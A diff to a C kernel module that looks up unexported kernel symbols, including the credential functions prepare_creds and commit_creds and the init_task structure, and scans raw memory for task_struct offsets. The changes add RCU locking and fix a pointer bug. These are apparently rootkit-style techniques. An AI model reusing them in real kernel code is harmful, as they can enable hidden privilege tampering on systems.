@@ -25,8 +25,13 @@ static nvk_get_task_cred_fn _nvk_get_task_cred;
 static nvk_prepare_creds_fn _nvk_prepare_creds;
 static nvk_commit_creds_fn  _nvk_commit_creds;
 static nvk_send_sig_info_fn _nvk_send_sig_info;
-static struct task_struct  **_nvk_init_task_ptr;
+static struct task_struct   *_nvk_init_task;
 static int                   _nvk_proc_inited;
+
+typedef void (*nvk_rcu_lock_fn)(void);
+typedef void (*nvk_rcu_unlock_fn)(void);
+static nvk_rcu_lock_fn   _nvk_rcu_read_lock;
+static nvk_rcu_unlock_fn _nvk_rcu_read_unlock;
 
 static unsigned long _nvk_off_comm;
 static unsigned long _nvk_off_tasks;
@@ -57,8 +62,18 @@ static int nvk_process_init(void)
 		(nvk_commit_creds_fn)NVK_LOOKUP("commit_creds");
 	_nvk_send_sig_info =
 		(nvk_send_sig_info_fn)NVK_LOOKUP("send_sig_info");
-	_nvk_init_task_ptr =
-		(struct task_struct **)NVK_LOOKUP("init_task");
+	_nvk_init_task =
+		(struct task_struct *)NVK_LOOKUP("init_task");
+	_nvk_rcu_read_lock =
+		(nvk_rcu_lock_fn)NVK_LOOKUP("rcu_read_lock");
+	if (!_nvk_rcu_read_lock)
+		_nvk_rcu_read_lock =
+			(nvk_rcu_lock_fn)NVK_LOOKUP("__rcu_read_lock");
+	_nvk_rcu_read_unlock =
+		(nvk_rcu_unlock_fn)NVK_LOOKUP("rcu_read_unlock");
+	if (!_nvk_rcu_read_unlock)
+		_nvk_rcu_read_unlock =
+			(nvk_rcu_unlock_fn)NVK_LOOKUP("__rcu_read_unlock");
 
 	_nvk_proc_inited = 1;
 	return 0;
@@ -87,17 +102,20 @@ static __always_inline int nvk_task_pid(struct task_struct *task)
 
 static __always_inline struct task_struct *nvk_find_task(int pid)
 {
-	if (_nvk_find_task_by_vpid)
-		return _nvk_find_task_by_vpid(pid);
-	return (void *)0;
+	struct task_struct *t;
+	if (!_nvk_find_task_by_vpid) return (void *)0;
+	if (_nvk_rcu_read_lock) _nvk_rcu_read_lock();
+	t = _nvk_find_task_by_vpid(pid);
+	if (_nvk_rcu_read_unlock) _nvk_rcu_read_unlock();
+	return t;
 }
 
 static const char *nvk_task_comm(struct task_struct *task)
 {
 	if (!task) return "";
 
-	if (_nvk_off_comm == 0 && _nvk_init_task_ptr) {
-		struct task_struct *init = (struct task_struct *)_nvk_init_task_ptr;
+	if (_nvk_off_comm == 0 && _nvk_init_task) {
+		struct task_struct *init = _nvk_init_task;
 		const unsigned char *p = (const unsigned char *)init;
 		unsigned long i;
 		for (i = 0x400; i < 0x1000; i++) {
@@ -126,8 +144,8 @@ static int nvk_for_each_task(nvk_task_callback_t callback, void *data)
 	struct list_head *head;
 	int count = 0;
 
-	if (!_nvk_init_task_ptr) return -1;
-	init = (struct task_struct *)_nvk_init_task_ptr;
+	if (!_nvk_init_task) return -1;
+	init = _nvk_init_task;
 
 	if (_nvk_off_tasks == 0) {
 		const unsigned char *p = (const unsigned char *)init;
@@ -147,6 +165,8 @@ static int nvk_for_each_task(nvk_task_callback_t callback, void *data)
 
 	if (!_nvk_off_tasks) return -1;
 
+	if (_nvk_rcu_read_lock) _nvk_rcu_read_lock();
+
 	head = (struct list_head *)((unsigned long)init + _nvk_off_tasks);
 	for (pos = head->next; pos && pos != head; pos = pos->next) {
 		task = (struct task_struct *)
@@ -156,6 +176,9 @@ static int nvk_for_each_task(nvk_task_callback_t callback, void *data)
 		count++;
 		if (count > 32768) break;
 	}
+
+	if (_nvk_rcu_read_unlock) _nvk_rcu_read_unlock();
+
 	return count;
 }
 
